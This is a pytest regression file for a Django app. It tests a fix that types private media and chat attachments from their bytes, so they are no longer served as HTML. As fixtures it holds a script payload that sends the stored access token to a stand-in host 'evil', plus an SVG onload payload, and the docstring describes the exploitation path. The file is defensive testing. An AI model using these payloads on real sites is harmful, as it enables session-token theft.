"""Sibling of R3-C2 on the *private* media tree.

R3-C2 closed `/media/public/`: `save_public()` now types an upload from its
magic bytes and nginx serves that whole location with `nosniff` + a sandbox
CSP. The private tree never went through either gate. It is served by Django
handing nginx an `X-Accel-Redirect` into the `internal` `/internal-media/`
location. An X-Accel-Redirect keeps the upstream's `Content-Type` and
`Content-Disposition` and drops its other headers (verified live), so
whatever `core.storage.private_accel_response()` declares is exactly what the
browser gets, on the app's own origin, where the JWT lives in `localStorage`
(CLAUDE.md invariant #1) — and nothing Django adds alongside it survives.

Both callers handed it a value the attacker writes:

* `chat/views.py` read it straight off the **query string**
  (`?mime=`) — nothing in the frontend has ever sent that parameter, so it
  was an attacker-only input. Any conversation participant could upload a
  `.txt` (the widget offers `.txt`/`.doc`/`.xls`) whose body is
  `<script>…</script>` and hand the other side a link with
  `&mime=text/html`. Verified live: `Content-Type: text/html`,
  `Content-Disposition: inline`, no `nosniff`.
* `students/document_views.py` read it from the stored `files[].mime`, which
  `save_private()` copied from the uploader's own `Content-Type` header.

The fix moves the decision to the bytes on disk, at the one choke point both
callers go through, and refuses to serve anything outside a small inline
allow-list as an inline document. Its other half — `nosniff`, which is what
makes the text/plain branch inert — lives on nginx's `/internal-media/`
location, because Django's copy is one of the headers the redirect drops;
that half is out of reach here, since the test container only mounts
`./backend`.
"""
import io
import uuid

import pytest
from django.contrib.auth import get_user_model
from django.core.files.uploadedfile import SimpleUploadedFile
from rest_framework.test import APIClient

from accounts.models import Role
from chat.models import Conversation
from core.storage import private_accel_response, save_private
from schools.models import School
from students.models import Student, StudentDocument

pytestmark = pytest.mark.django_db

XSS = b'<script>fetch("//evil/"+localStorage.getItem("access_token"))</script>'


def _png_bytes():
    from PIL import Image

    buf = io.BytesIO()
    Image.new("RGB", (4, 4), (10, 20, 30)).save(buf, format="PNG")
    return buf.getvalue()


def _upload(content: bytes, name: str, content_type: str):
    return SimpleUploadedFile(name, content, content_type=content_type)


def _store(tmp_path, content: bytes, name="notes.txt", content_type="text/plain") -> dict:
    return save_private(_upload(content, name, content_type), subdir="documents")


# --- the choke point itself -------------------------------------------------


def test_html_body_is_never_served_as_a_document(settings, tmp_path):
    """The live repro, straight at the function: the payload is text, so it
    may come back as text/plain — never as anything a browser executes."""
    settings.MEDIA_ROOT = str(tmp_path)
    info = _store(tmp_path, XSS)
    response = private_accel_response(info["path"], filename="notes.txt")
    assert response["Content-Type"].startswith("text/plain")


def test_a_real_image_is_typed_from_its_bytes(settings, tmp_path):
    """A `.txt`-named PNG is still an image: the served type follows the
    bytes, so <img src> keeps working without anyone declaring a type."""
    settings.MEDIA_ROOT = str(tmp_path)
    info = _store(tmp_path, _png_bytes(), name="photo.txt")
    response = private_accel_response(info["path"], filename="photo.txt")
    assert response["Content-Type"] == "image/png"
    assert response["Content-Disposition"].startswith("inline")


def test_a_pdf_is_still_served_inline(settings, tmp_path):
    """Documents are the whole point of the private tree — a real PDF must
    keep opening in the tab rather than downloading."""
    settings.MEDIA_ROOT = str(tmp_path)
    info = _store(tmp_path, b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n1 0 obj\n", name="cert.pdf")
    response = private_accel_response(info["path"], filename="cert.pdf")
    assert response["Content-Type"] == "application/pdf"
    assert response["Content-Disposition"].startswith("inline")


def test_bytes_outside_the_allow_list_download_instead_of_rendering(settings, tmp_path):
    """A .docx (a zip) is not on the inline list: octet-stream + attachment,
    which no browser renders as anything."""
    settings.MEDIA_ROOT = str(tmp_path)
    info = _store(tmp_path, b"PK\x03\x04" + b"\x00" * 40, name="cv.docx")
    response = private_accel_response(info["path"], filename="cv.docx")
    assert response["Content-Type"] == "application/octet-stream"
    assert response["Content-Disposition"].startswith("attachment")


def test_every_private_response_carries_nosniff(settings, tmp_path):
    """text/plain is only inert while the browser is forbidden to sniff it
    back into HTML."""
    settings.MEDIA_ROOT = str(tmp_path)
    info = _store(tmp_path, XSS)
    response = private_accel_response(info["path"], filename="notes.txt")
    assert response["X-Content-Type-Options"] == "nosniff"


# --- through the two endpoints the finding was reported against -------------


@pytest.fixture
def school():
    return School.objects.create(
        name="QA School", slug=f"qa-{uuid.uuid4().hex[:6]}", email=f"{uuid.uuid4().hex[:6]}@example.com"
    )


@pytest.fixture
def student_client(school):
    email = f"s-{uuid.uuid4().hex[:8]}@example.com"
    user = get_user_model().objects.create(
        email=email, role=Role.STUDENT, roles=[Role.STUDENT], active_school=school
    )
    student = Student.objects.create(user=user, name="QA Student", email=email, school=school)
    api = APIClient()
    api.force_authenticate(user=user)
    return api, student


def test_chat_attachment_ignores_the_mime_query_parameter(student_client, school, settings, tmp_path):
    """The exact live repro: upload a `.txt` full of script, ask for it back
    as `text/html`. 200 + `Content-Type: text/html` before the fix."""
    settings.MEDIA_ROOT = str(tmp_path)
    api, student = student_client
    conversation = Conversation.objects.create(
        type=Conversation.Type.SCHOOL_STUDENT, school=school, student=student
    )

    upload = api.post(
        f"/api/chat/conversations/{conversation.id}/attachment/",
        {"file": _upload(XSS, "notes.txt", "text/plain")},
        format="multipart",
    )
    assert upload.status_code == 201, upload.content
    path = upload.json()["attachment_url"]

    resp = api.get(
        f"/api/chat/conversations/{conversation.id}/attachment/",
        {"path": path, "name": "notes.txt", "mime": "text/html"},
    )
    assert resp.status_code == 200, resp.content
    assert resp["Content-Type"].startswith("text/plain")
    assert resp["X-Content-Type-Options"] == "nosniff"


def test_chat_attachment_ignores_a_scriptable_svg_mime(student_client, school, settings, tmp_path):
    """`image/svg+xml` runs script when opened directly, same as text/html."""
    settings.MEDIA_ROOT = str(tmp_path)
    api, student = student_client
    conversation = Conversation.objects.create(
        type=Conversation.Type.SCHOOL_STUDENT, school=school, student=student
    )
    svg = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'
    upload = api.post(
        f"/api/chat/conversations/{conversation.id}/attachment/",
        {"file": _upload(svg, "x.svg", "image/svg+xml")},
        format="multipart",
    )
    path = upload.json()["attachment_url"]

    resp = api.get(
        f"/api/chat/conversations/{conversation.id}/attachment/",
        {"path": path, "name": "x.svg", "mime": "image/svg+xml"},
    )
    assert resp.status_code == 200
    assert "svg" not in resp["Content-Type"]


def test_document_file_ignores_the_uploaders_content_type_header(student_client, school, settings, tmp_path):
    """`files[].mime` is `save_private()`'s copy of the client's own
    Content-Type header — it decided how the file came back."""
    settings.MEDIA_ROOT = str(tmp_path)
    api, student = student_client

    upload = api.post(
        "/api/documents/upload/",
        {"file": _upload(XSS, "cert.txt", "text/html")},
        format="multipart",
    )
    assert upload.status_code == 201, upload.content
    entry = upload.json()

    doc = StudentDocument.objects.create(student=student, school=school, files=[entry])
    resp = api.get(f"/api/documents/{doc.id}/file/", {"path": entry["path"]})
    assert resp.status_code == 200, resp.content
    assert resp["Content-Type"].startswith("text/plain")
    assert resp["X-Content-Type-Options"] == "nosniff"
